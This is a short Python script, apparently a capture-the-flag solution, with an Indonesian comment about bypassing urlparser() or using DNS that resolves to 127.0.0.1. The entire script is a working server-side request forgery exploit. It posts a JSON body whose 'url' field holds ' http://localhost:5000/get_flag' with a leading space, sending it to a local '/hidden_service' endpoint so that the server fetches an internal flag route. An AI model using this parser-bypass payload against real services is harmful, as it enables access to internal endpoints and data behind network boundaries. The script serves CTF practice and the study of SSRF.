"""
Intended solutionnya bypass urlparser() tapi bisa juga make dns yang pointing ke 127.0.0.1.
"""
import requests

if __name__ == "__main__":
    url = "http://127.0.0.1:5000/hidden_service"
    payload = {
        "provider": "python",
        "url" : " http://localhost:5000/get_flag"
    }
    headers = {'Content-Type': "application/json"}
    response = requests.post(url, json=payload, headers=headers)
    print(response.status_code, response.text)
